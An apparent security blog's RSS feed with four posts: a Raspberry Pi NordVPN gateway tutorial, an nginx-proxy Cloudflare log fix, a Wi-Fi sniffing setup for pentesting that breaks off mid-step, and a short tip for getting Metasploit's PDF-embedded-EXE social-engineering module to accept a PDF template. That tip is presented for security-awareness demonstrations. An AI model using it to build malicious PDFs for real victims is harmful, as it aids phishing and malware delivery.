<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Zone13.io</title>
    <link>https://zone13.io/post/</link>
    <description>Recent content in Posts on Zone13.io</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <copyright>All rights reserved - 2017</copyright>
    <lastBuildDate>Wed, 01 Jan 2020 12:01:11 +0000</lastBuildDate>
    <atom:link href="https://zone13.io/post/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Configuring Raspberry Pi as a VPN gateway using NordVPN with best server selection (Pi-hole with DoH setup optional)</title>
      <link>https://zone13.io/post/raspberry-pi-vpn-gateway-for-nordvpn/</link>
      <pubDate>Wed, 01 Jan 2020 12:01:11 +0000</pubDate>
      
      <guid>https://zone13.io/post/raspberry-pi-vpn-gateway-for-nordvpn/</guid>
      <description>

&lt;p&gt;This is going to be a quick tutorial (/self-reference) to set up Raspberry Pi as a VPN router for NordVPN. I ran into so many issues (!) specially with the kill-switch part, so just wanted to write this up in case someone else is looking for the same. Obviously there are better ways of getting this done documented out there, but I wanted a custom setup with a few modifications as you will see. As an add-on, I installed Pi-hole for ad  &amp;amp; malicious domain blocking with &lt;a href=&#34;https://docs.pi-hole.net/guides/dns-over-https/&#34;&gt;DNS over HTTPS (DoH)&lt;/a&gt;, with the DNS queries now tunneled over VPN.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;: I&amp;rsquo;m doing this on a fresh RPi installation with no firewall rules setup etc. So make sure to adapt the steps if you plan to do it on an existing RPi. Also the code snippets will need to be amended to include input validations and sanitizations if you want to run it on any critical / production system. Also hardcoding of credentials in plaintext is not that great either, but pursued in the interest of a test lab setup only and may not be fully suitable for real world use.&lt;/p&gt;

&lt;h3 id=&#34;requirements&#34;&gt;Requirements&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;The RPi will be connected to the LAN network with a static IP address. Those devices wanting to use the RPi gateway should be able to edit the &amp;lsquo;gateway&amp;rsquo; field under network settings and must be able to connect to the VPN seamlessly.&lt;/li&gt;
&lt;li&gt;The RPi will use NordVPN as the provider with a kill-switch to disable Internet in the event of VPN failure. NordVPN provides the kill-switch feature with their apps &lt;del&gt;but not for RPi&lt;/del&gt;. &lt;em&gt;Correction - NordVPN provides &lt;a href=&#34;https://support.nordvpn.com/Connectivity/Linux/1325531132/Installing-and-using-NordVPN-on-Debian-Ubuntu-and-Linux-Mint.htm&#34;&gt;this&lt;/a&gt;. Thanks to u/4grams on Reddit for pointing that out.&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Ability to find the best server from NordVPN and establish the connection&lt;/li&gt;
&lt;li&gt;Ad blocking using Pi-hole for the devices using the gateway&lt;/li&gt;
&lt;li&gt;DNS over HTTPS (on Pi-hole)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;hardware&#34;&gt;Hardware&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Raspberry Pi 3B&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.samsung.com/uk/memory-storage/evo-microsd-card/MB-MP16DEU/&#34;&gt;Micro SD card - 16 GB - Samsung EVO&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;configuration&#34;&gt;Configuration&lt;/h3&gt;

&lt;h5 id=&#34;set-up-rpi&#34;&gt;Set up RPi&lt;/h5&gt;

&lt;ul&gt;
&lt;li&gt;Official documentation &lt;a href=&#34;https://www.raspberrypi.org/documentation/installation/installing-images/README.md&#34;&gt;link&lt;/a&gt; to burn Raspbian on to the Micro SD card. . I will be using
&lt;a href=&#34;https://www.raspberrypi.org/downloads/raspbian/&#34;&gt;Raspbian Buster Lite (Version:September 2019)&lt;/a&gt;  for this tutorial.&lt;/li&gt;
&lt;li&gt;The rest of the tutorial will require ssh to be enabled. So create a blank file named &amp;lsquo;ssh&amp;rsquo; and place in the root folder of the SD card. More details here - &lt;a href=&#34;https://www.raspberrypi.org/documentation/remote-access/ssh/&#34;&gt;[3. Enable SSH on a headless Raspberry Pi (add file to SD card on another machine)]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Eject the SD card, insert into the RPi and power it ON&lt;/li&gt;
&lt;li&gt;I&amp;rsquo;m not covering securing the RPi in this tutorial, so please make sure you do the necessary&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&#34;connect-to-the-rpi-using-a-tool-like-putty&#34;&gt;Connect to the RPi using a tool like PuTTY&lt;/h5&gt;

&lt;h5 id=&#34;br&#34;&gt;&lt;br/&gt;&lt;/h5&gt;

&lt;h5 id=&#34;run-raspi-config-https-www-raspberrypi-org-documentation-configuration-raspi-config-md-utility-to-resize-the-partition-and-reboot&#34;&gt;Run &lt;a href=&#34;https://www.raspberrypi.org/documentation/configuration/raspi-config.md&#34;&gt;raspi-config&lt;/a&gt; utility to resize the partition and reboot&lt;/h5&gt;

&lt;p&gt;&lt;br/&gt;&lt;/p&gt;

&lt;h5 id=&#34;configure-static-ip-address-for-the-rpi&#34;&gt;Configure static IP address for the RPI&lt;/h5&gt;

&lt;p&gt;Open &lt;strong&gt;/etc/network/interfaces&lt;/strong&gt; and add the below lines. Make sure to adapt the info for your network setup.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;auto eth0
    iface eth0 inet static
    address 192.168.0.100
    netmask 255.255.255.0
    gateway 192.168.0.1
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;install-updates-upgrades&#34;&gt;Install updates, upgrades..&lt;/h5&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo apt update &amp;amp;&amp;amp; sudo apt upgrade -y &amp;amp;&amp;amp; sudo apt dist-upgrade -y &amp;amp;&amp;amp; sudo apt autoremove -y
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;install-necessary-packages&#34;&gt;Install necessary packages&lt;/h5&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo apt install openvpn iptables-persistent python-requests -y
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;While installing iptables-persistent, it might ask if you want to backup the iptables rules. Go ahead and select Yes. This will be overwritten anyway at a later stage.&lt;/p&gt;

&lt;h5 id=&#34;nordvpn-setup&#34;&gt;NordVPN setup&lt;/h5&gt;

&lt;p&gt;Download and unzip the NordVPN config files to &lt;strong&gt;/etc/openvpn&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cd /etc/openvpn
sudo wget https://nordvpn.com/api/files/zip
sudo unzip zip
sudo rm zip
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Create a file named &lt;strong&gt;/etc/openvpn/login.txt&lt;/strong&gt; and insert the NordVPN credentials&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/rpi-gw-creds.png&#34; alt=&#34;Credentials&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Chmod the login.txt file to 600 so that it is only accessible by root user&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo chmod 600 /etc/openvpn/login.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Edit the NordVPN&amp;rsquo;s ovpn files to use login.txt. This is done by replacing &lt;strong&gt;auth-user-pass&lt;/strong&gt; with &lt;strong&gt;auth-user-pass login.txt&lt;/strong&gt; Here is a small python code snippet to do that.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

import fileinput
import glob
import os

os.chdir(&amp;quot;/etc/openvpn&amp;quot;)

file_list = glob.glob(&amp;quot;*.ovpn&amp;quot;)

for item in file_list:
    for line in fileinput.input(item, inplace = 1):
        print line.replace(&amp;quot;auth-user-pass&amp;quot;, &amp;quot;auth-user-pass login.txt&amp;quot;),
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;now-which-nordvpn-location-do-you-want-to-connect-to-you-need-to-find-the-corresponding-url&#34;&gt;Now, which NordVPN location do you want to connect to? You need to find the corresponding URL.&lt;/h5&gt;

&lt;p&gt;Visit the &lt;a href=&#34;https://nordvpn.com/servers/tools/&#34;&gt;NordVPN server tools&lt;/a&gt; page where you can find the most optimal server&lt;/p&gt;

&lt;p&gt;Open Developer Tools in your browser and click on XHR&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/rpi-gw-server-locate-1.png&#34; alt=&#34;XHR enable&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Now select the country that you want to use for the VPN connection and observe the XHR request that gets generated. Right click on the XHR request and copy the URL. The URL will be used in the next step.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/rpi-gw-server-locate-2.png&#34; alt=&#34;Get URL&#34; /&gt;&lt;/p&gt;

&lt;p&gt;e.g. for Australia, the URL would be&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;https://nordvpn.com/wp-admin/admin-ajax.php?action=servers_recommendations&amp;amp;filters={&amp;quot;country_id&amp;quot;:13}
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;nordvpn-connection-script&#34;&gt;NordVPN connection script&lt;/h5&gt;

&lt;p&gt;Now we need to tell the RPi to connect to the NordVPN server on boot. Here is a Python script that does that. Save it on your RPi - e.g. &lt;strong&gt;/home/pi/vpn/connector.py&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;u&gt;Make sure you fill in the url field in script from previous step.&lt;/u&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python

import os
import json
import subprocess
import time
import requests

os.chdir(&amp;quot;/etc/openvpn&amp;quot;)

# Command to kill any running instances of OpenVPN
kill_command = &amp;quot;sudo killall openvpn&amp;quot;

# URL to the NordVPN server connection tool obtained from the browser
url = &amp;quot;&amp;quot; # Insert URL here

def start_openvpn_connection():
    response = requests.get(url)

    if len(response.text) != 2:
        nvpn_response = json.loads(response.text)
        vpn_info = nvpn_response[0]
        vpn_info_hostname = vpn_info[&amp;quot;hostname&amp;quot;]
        vpn_file = vpn_info_hostname + &amp;quot;.udp1194.ovpn&amp;quot;

        # Command to start Openvpn
        ov_command = &amp;quot;sudo openvpn --config &amp;quot; + vpn_file

        # Start the NordVPN connection
        subprocess.Popen(ov_command.split())

if __name__ == &amp;quot;__main__&amp;quot;:
    subprocess.Popen(kill_command.split())
    time.sleep(2)
    start_openvpn_connection()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Run the script at startup. There are various ways to do this. Here we will be using rc.local.&lt;/p&gt;

&lt;p&gt;Open &lt;strong&gt;/etc/rc.local&lt;/strong&gt; and insert the script before &amp;lsquo;exit 0&amp;rsquo; line.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/rpi-gw-rc-local.png&#34; alt=&#34;rc.local&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;find-nordvpn-server-ips&#34;&gt;Find NordVPN server IPs&lt;/h5&gt;

&lt;p&gt;In the next step, we will be locking down the RPi to block all outgoing traffic and allow only NordVPN IPs. The NordVPN IPs will be used to fetch the best server for the location you opted. (This is not a very scalable approach to hardcode IPs but for the sake of this tutorial, we will use this. If NordVPN changes their IPs in future, make sure you update the iptables rules.)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Use nslookup to find NordVPN IPs&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/rpi-gw-nv-ips.png&#34; alt=&#34;nvpn ips&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;add-nordvpn-ip-addresses-to-hosts-file-and-block-outbound-dns&#34;&gt;Add NordVPN IP addresses to hosts file and block outbound DNS&lt;/h5&gt;

&lt;p&gt;Open &lt;strong&gt;/etc/hosts&lt;/strong&gt; file and add the below lines&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;104.18.229.229  nordvpn.com
104.18.230.229  nordvpn.com
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;set-up-ip-forwarding&#34;&gt;Set up IP forwarding&lt;/h5&gt;

&lt;p&gt;Open &lt;strong&gt;/etc/sysctl.conf&lt;/strong&gt; and uncomment the below line.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;net.ipv4.ip_forward=1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Run the following command to enable the changes.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sysctl -p /etc/sysctl.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;iptables-rules-for-allowing-ssh-routing-traffic-kill-switch-block-outbound-dns-whitelist-nordvpn-ips&#34;&gt;Iptables rules for allowing SSH, routing traffic, kill-switch, block outbound DNS whitelist NordVPN IPs..&lt;/h5&gt;

&lt;p&gt;&lt;u&gt;Note: This will flush all your existing iptables rules.&lt;/u&gt;&lt;/p&gt;

&lt;p&gt;&lt;u&gt;Note: Make sure to replace 192.168.0.0/24 with the RPi&amp;rsquo;s LAN subnet from where you expect the devices to connect and use the gateway.&lt;/u&gt;&lt;/p&gt;

&lt;p&gt;Save the following into a bash file and execute or run one by one.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo iptables -F
sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
sudo iptables -A OUTPUT -p tcp --sport 22 -m conntrack --ctstate ESTABLISHED -j ACCEPT

sudo iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE
sudo iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT

sudo iptables -A OUTPUT -o tun0 -m comment --comment &amp;quot;vpn&amp;quot; -j ACCEPT
sudo iptables -A OUTPUT -o eth0 -p icmp -m comment --comment &amp;quot;icmp&amp;quot; -j ACCEPT
sudo iptables -A OUTPUT -d 192.168.0.0/24 -o eth0 -m comment --comment &amp;quot;lan&amp;quot; -j ACCEPT
sudo iptables -A OUTPUT -o eth0 -p udp -m udp --dport 1194 -m comment --comment &amp;quot;allow vpn traffic&amp;quot; -j ACCEPT
sudo iptables -A OUTPUT -o eth0 -p udp -m udp --dport 123 -m comment --comment &amp;quot;ntp&amp;quot; -j ACCEPT
sudo iptables -A OUTPUT -p tcp -d 104.18.229.229 --dport 443 -m comment --comment &amp;quot;nordvpn IP&amp;quot; -j ACCEPT
sudo iptables -A OUTPUT -p tcp -d 104.18.230.229 --dport 443 -m comment --comment &amp;quot;nordvpn IP&amp;quot; -j ACCEPT
sudo iptables -A OUTPUT -o eth0 -j DROP
sudo iptables -I FORWARD -i eth0 ! -o tun0 -j DROP

sudo iptables-save | sudo tee /etc/iptables/rules.v4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Reboot the Pi and make sure the VPN gateway is working. If you run into issues, check /var/log/syslog to see the errors.&lt;/p&gt;

&lt;p&gt;Also kill the openvpn process and ensure that the kill-switch works.&lt;/p&gt;

&lt;h5 id=&#34;optional-pi-hole-with-dns-over-https&#34;&gt;Optional - Pi-hole with DNS over HTTPS&lt;/h5&gt;

&lt;p&gt;Install &lt;a href=&#34;https://github.com/pi-hole/pi-hole/#one-step-automated-install&#34;&gt;Pi-hole&lt;/a&gt; (make sure to select eth0 as the listening interface)&lt;/p&gt;

&lt;p&gt;Install &lt;a href=&#34;https://docs.pi-hole.net/guides/dns-over-https/&#34;&gt;cloudflared&lt;/a&gt; and configure Pi-hole to use it. &lt;u&gt;The Pi-hole configuration to use DoH needs to be done from the Pi-hole&amp;rsquo;s web UI.&lt;/u&gt;&lt;/p&gt;

&lt;p&gt;Once Pi-hole is configured to use cloudflared, the DNS queries will now be tunneled over HTTPS over NordVPN.&lt;/p&gt;

&lt;p&gt;NordVPN has its own ad blockers, I simply wanted to use Pi-hole for the ad blocking.&lt;/p&gt;

&lt;h5 id=&#34;speedtest-results&#34;&gt;Speedtest results&lt;/h5&gt;

&lt;p&gt;All tests were averaged out over three runs on a 100 Mbps / 24 Mbps line. The VPN connection was made to the closest geographical server.&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Connection method&lt;/th&gt;
&lt;th&gt;VPN enabled&lt;/th&gt;
&lt;th&gt;Download (Mbps)&lt;/th&gt;
&lt;th&gt;Upload (Mbps)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;RPi -&amp;gt; router&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;td&gt;77.8&lt;/td&gt;
&lt;td&gt;3.5&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;RPi  -&amp;gt; router&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;61.0&lt;/td&gt;
&lt;td&gt;3.5&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;Mobile device -&amp;gt; RPi -&amp;gt;  router&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;45.1&lt;/td&gt;
&lt;td&gt;23.5&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Hope you find the tutorial useful. If you have any queries, suggestions etc. please post a comment and I will try to answer.&lt;/p&gt;

&lt;p&gt;References:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://dietpi.com/phpbb/viewtopic.php?t=2185&#34;&gt;https://dietpi.com/phpbb/viewtopic.php?t=2185&lt;/a&gt;&lt;/p&gt;

&lt;h5 id=&#34;update-1-31-12-2019&#34;&gt;Update 1 (31/12/2019):&lt;/h5&gt;

&lt;p&gt;Change log:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Removed redundant iptables rules&lt;/li&gt;
&lt;li&gt;Blocked outbound DNS queries on port 53, added NordVPN IPs to hosts file&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&#34;update-2-31-12-2019&#34;&gt;Update 2 (31/12/2019):&lt;/h5&gt;

&lt;p&gt;Change log:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Added Speedtest results&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Restoring real IP address from Cloudflare in logs when using nginx-proxy with Docker</title>
      <link>https://zone13.io/post/docker-nginx-proxy-cloudflare-restore-real-ip/</link>
      <pubDate>Mon, 19 Mar 2018 20:47:25 +0200</pubDate>
      
      <guid>https://zone13.io/post/docker-nginx-proxy-cloudflare-restore-real-ip/</guid>
      <description>&lt;p&gt;While using &lt;a href=&#34;https://github.com/jwilder/nginx-proxy&#34;&gt;nginx-proxy from jwilder&lt;/a&gt; with Cloudflare, one of the common issues you run into is that the logs contain the Docker internal IP rather than the real external IP passed by Cloudflare.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/cf-nginx-proxy-1.png&#34; alt=&#34;Internal IP&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Note - During my tests, this only applies when nginx-proxy is run as two separate containers -  &lt;a href=&#34;jwilder/docker-gen&#34;&gt;jwilder/docker-gen&lt;/a&gt; and the official nginx image. Also, I have whitelisted my server to accept connections only from &lt;a href=&#34;https://www.cloudflare.com/ips&#34;&gt;Cloudflare IP range&lt;/a&gt; to port 443 (Full - Strict config).&lt;/p&gt;

&lt;p&gt;Basically nginx-proxy serves as a high performance reverse proxy that lets you run multiple websites behind it. For more info, please read &lt;a href=&#34;http://jasonwilder.com/blog/2014/03/25/automated-nginx-reverse-proxy-for-docker/&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Coming back to the issue, all you need to do to fix the IP is to edit the &lt;a href=&#34;https://github.com/jwilder/nginx-proxy/blob/master/nginx.tmpl&#34;&gt;nginx.tmpl&lt;/a&gt; file that comes with the nginx-proxy.&lt;/p&gt;

&lt;p&gt;Original snippet (line 63)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;log_format vhost &#39;$host $remote_addr - $remote_user [$time_local] &#39;
                 &#39;&amp;quot;$request&amp;quot; $status $body_bytes_sent &#39;
                 &#39;&amp;quot;$http_referer&amp;quot; &amp;quot;$http_user_agent&amp;quot;&#39;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Change  &lt;strong&gt;remote_addr&lt;/strong&gt; to either &lt;strong&gt;http_cf_connecting_ip&lt;/strong&gt; or &lt;strong&gt;http_x_forwarded_for&lt;/strong&gt; as &lt;a href=&#34;https://support.cloudflare.com/hc/en-us/articles/200170706-How-do-I-restore-original-visitor-IP-with-Nginx-&#34;&gt;explained&lt;/a&gt; by Cloudflare.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;log_format vhost &#39;$host $http_cf_connecting_ip - $remote_user [$time_local] &#39;
                 &#39;&amp;quot;$request&amp;quot; $status $body_bytes_sent &#39;
                 &#39;&amp;quot;$http_referer&amp;quot; &amp;quot;$http_user_agent&amp;quot;&#39;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;OR&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;log_format vhost &#39;$host $http_x_forwarded_for - $remote_user [$time_local] &#39;
                 &#39;&amp;quot;$request&amp;quot; $status $body_bytes_sent &#39;
                 &#39;&amp;quot;$http_referer&amp;quot; &amp;quot;$http_user_agent&amp;quot;&#39;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now start the containers and you will see that logs report the real IP.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/cf-nginx-proxy-2.png&#34; alt=&#34;External IP&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Embedding EXE payload in PDF using Metasploit - fixing PDF template errors</title>
      <link>https://zone13.io/post/embedding_exe_in_pdf_using_Metasploit/</link>
      <pubDate>Sun, 05 Nov 2017 13:59:51 +0000</pubDate>
      
      <guid>https://zone13.io/post/embedding_exe_in_pdf_using_Metasploit/</guid>
      <description>&lt;p&gt;If you have ever tried embedding EXEs in an existing PDF file using Metasploit, most likely you might have come across the error:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;[-] Sorry, I&#39;m picky. Incompatible PDF structure: key not found: &amp;quot;Root&amp;quot;. Please try a different PDF template.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pdf_before.png&#34; alt=&#34;Load PDF&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Details on the &amp;lsquo;Adobe PDF Embedded EXE Social Engineering&amp;rsquo; Metasploit module can be found &lt;a href=&#34;https://www.rapid7.com/db/modules/exploit/windows/fileformat/adobe_pdf_embedded_exe&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This is quite an old exploit but still useful in security awareness demonstrations. Recently I had to do one and ran into errors embedding an EXE payload.&lt;/p&gt;

&lt;p&gt;To solve the error, open the clean PDF file in Microsoft Word &lt;sup&gt;2013&lt;/sup&gt;&amp;frasl;&lt;sub&gt;2016&lt;/sub&gt; and again save the file in PDF format.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/save_as_pdf.png&#34; alt=&#34;Save PDF Using MS Word&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Load the EXE into the modified PDF and it works !!&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pdf_after.png&#34; alt=&#34;Load PDF&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Wi-Fi packet sniffing / monitoring on Windows using Raspberry Pi - inspired by Wimonitor</title>
      <link>https://zone13.io/post/wifi-monitoring-using-raspberry-pi/</link>
      <pubDate>Sun, 08 Oct 2017 11:15:12 +0100</pubDate>
      
      <guid>https://zone13.io/post/wifi-monitoring-using-raspberry-pi/</guid>
      <description>

&lt;p&gt;&lt;a href=&#34;https://www.hackerarsenal.com/products/wimonitor&#34;&gt;Wimonitor&lt;/a&gt; is a wonderful product from Hacker Arsenal that saves pentesters the hassle of having to configure VMs, carry compatible wireless cards that support monitor mode etc. and comes with a web interface to do the configurations. It gives you the flexibility to plug in the device into the Ethernet port and start Wi-Fi monitoring on any OS. Basically it is a &lt;a href=&#34;http://www.tp-link.com/il/products/details/cat-14_TL-MR3020.html&#34;&gt;tp-link TL-MR3020&lt;/a&gt; router with a custom firmware that does all the monitoring part and sends the packets to the host laptop (or Mac !) where you can start Wireshark and concentrate on the packet analysis.&lt;/p&gt;

&lt;p&gt;I haven&amp;rsquo;t got one yet, but have been hearing good reviews about the product since launch. The shipping cost to EU is a bummer :(. Hopefully they will start shipping from EU soon.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Meanwhile - why not try this on a Raspberry Pi ?&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The Pi can run a variety of OS including Kali and I have had good success using Pi&amp;rsquo;s during Wi-Fi pentests. The Raspberry Pi 3B is powerful enough to do stable monitoring and with a few simple steps can be converted to a Wimonitor (well, almost !).&lt;/p&gt;

&lt;p&gt;The awesome folks at Hacker Arsenal have done a brilliant job in building Wimonitor. It is a stable plug n play device with firmware support expected. So if you are a beginner to Wi-Fi security or need a trouble free monitoring tool, I would recommend going with Wimonitor.&lt;/p&gt;

&lt;h4 id=&#34;required-hardware&#34;&gt;&lt;strong&gt;Required hardware&lt;/strong&gt;&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;Host laptop running Windows(tests and screenshots done on Windows 8.1)&lt;/li&gt;
&lt;li&gt;Raspberry Pi 3B, micro SD card, power adapter (USB 3.0 power should be enough to power the Pi + wireless card)&lt;/li&gt;
&lt;li&gt;Ethernet cable to connect the Pi to host laptop&lt;/li&gt;
&lt;li&gt;Wi-Fi card supporting monitor mode (e.g. TL-WN722N v1)&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;setup&#34;&gt;&lt;strong&gt;Setup&lt;/strong&gt;&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Burn &lt;a href=&#34;https://www.raspberrypi.org/downloads/raspbian/&#34;&gt;RASPBIAN STRETCH LITE&lt;/a&gt; on to the micro SD card. The OS is light weight and comes with out of the box monitor mode support for cards like TL-WN722N. If you are not sure on how to burn the OS, steps can be found &lt;a href=&#34;http://www.raspberry-projects.com/pi/pi-operating-systems/win32diskimager&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Once Raspbian is written to the micro SD card, enable SSH on the Pi. This can be done by creating a blank file named &lt;em&gt;ssh&lt;/em&gt; (note: no file extension) on the micro SD card.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;In order to make the host laptop communicate with the Pi, the easiest method is to share the host laptop Wi-Fi with the Pi over Ethernet. This will ensure that the Pi gets an IP address in the range 192.168.137.x. To do this, go to network connections (ncpa.cpl), right-click on the Wi-Fi adapter and select Properties. Under the Sharing tab, select the Ethernet adapter to which you will plug in the Pi. Click OK.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-wifi-properties.png&#34; alt=&#34;pi-monitor-wifi-properties&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;It is now time to connect the Pi to the host laptop. Insert the micro SD card into the Pi&amp;rsquo;s slot, Wi-Fi card into the USB port, connect the Ethernet cable between the host laptop and Pi and power ON.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Once the Pi boots up, it should get an IP using the shared connection. The easiest way to discover Pi&amp;rsquo;s IP address is to use &lt;a href=&#34;https://nmap.org/download.html&#34;&gt;nmap&lt;/a&gt; on the host laptop and do a host discovery on 192.168.137.1 /24 subnet.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-nmap-scan.png&#34; alt=&#34;pi-monitor-nmap-scan&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Open &lt;a href=&#34;https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html&#34;&gt;PuTTY&lt;/a&gt; and ssh into Pi. The default username / password is &lt;strong&gt;pi&lt;/strong&gt; / &lt;strong&gt;raspberry&lt;/strong&gt; for the Raspbian OS we are using.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-putty-login.png&#34; alt=&#34;pi-monitor-putty-login&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;To set a static IP for the Pi, open up &lt;em&gt;/etc/dhcpcd.conf&lt;/em&gt; and add the following lines at the end of the file:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;interface eth0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;static ip_address=192.168.137.100/24&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;static routers=192.168.137.1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;static domain_name_servers=192.168.137.1&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;I prefer to use key based authentication for the SSH login. To do that open PuTTYgen that comes with PuTTYgen and generate a key pair.&lt;/li&gt;
&lt;/ul&gt;

